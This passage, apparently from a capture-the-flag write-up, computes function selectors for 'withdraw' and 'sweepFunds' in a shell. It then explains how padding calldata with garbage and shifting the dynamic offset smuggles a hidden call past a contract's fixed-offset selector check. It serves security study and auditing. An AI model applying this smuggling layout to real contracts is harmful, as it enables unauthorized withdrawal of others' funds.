┌──(samson)─[184]─[20:05:44]─[0:00:00.008073]─[kali@DESKTOP-0Q6Q7UG]─[/home/kali]
└─$ keccak256.hash(b'withdraw(address,address,uint256)')[:4].hex()
<Bytes: b'd9caed12', byteorder='big'>

┌──(samson)─[185]─[20:07:13]─[0:00:00.011920]─[kali@DESKTOP-0Q6Q7UG]─[/home/kali]
└─$ keccak256.hash(b'sweepFunds(address,address)')[:4].hex()
<Bytes: b'85fb709d', byteorder='big'>
```

The contract is then able to lookup the function and execute it. The arguments proceed directly after. If the argument type is dynamically sized like `bytes`, `string`, or `T[]`, then an offset from the **start** of the arguments block to the real location is placed there instead. All elementary types are padded to 32 bytes with padding direction depending on the type. All higher-order types can be recursively deconstructed into these elementary types.

So `execute(address target, bytes calldata actionData)` turns into
`[selector (4 bytes)][address (32 bytes)][actionDataOffset (32 bytes)][actionDataSize (32 bytes)][actionData (32*k bytes)]`.

Because `actionData` will have the `callData`.
```
[selector (4 bytes)][address (32 bytes)][actionDataOffset (32 bytes)][actionDataSize (32 bytes)][[selector (4 bytes)][argument block]]
                                                                                                 ^
                                                                                                 uint256 calldataOffset = 4 + 32 * 3;
```

Note that nothing says you can't insert garbage between the argument block and the dynamic data block.
```
[selector (4 bytes)][address (32 bytes)][actionDataOffset + 0x20 (32 bytes)]*[GARBAGE (32 bytes)]*[actionDataSize (32 bytes)][actionData (32*k bytes)]
                                                                             ^
                                                                             uint256 calldataOffset = 4 + 32 * 3;
```
